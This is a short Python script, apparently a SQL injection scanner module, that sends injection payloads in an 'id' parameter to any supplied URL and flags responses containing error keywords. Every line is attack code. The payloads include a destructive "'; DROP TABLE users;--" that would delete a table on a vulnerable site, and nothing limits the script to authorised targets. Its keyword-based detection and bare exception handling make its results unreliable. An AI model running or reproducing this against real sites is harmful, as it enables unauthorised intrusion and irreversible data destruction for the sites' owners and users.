import requests

def run(url):
    print("[SQLi Test] Running...")
    payloads = ["' OR '1'='1", "' UNION SELECT NULL--", "'; DROP TABLE users;--"]
    for payload in payloads:
        try:
            r = requests.get(url, params={"id": payload}, timeout=3)
            if any(e in r.text.lower() for e in ["sql", "syntax", "error"]):
                print(f"[SQLi] Error-based injection found: {payload}")
        except:
            continue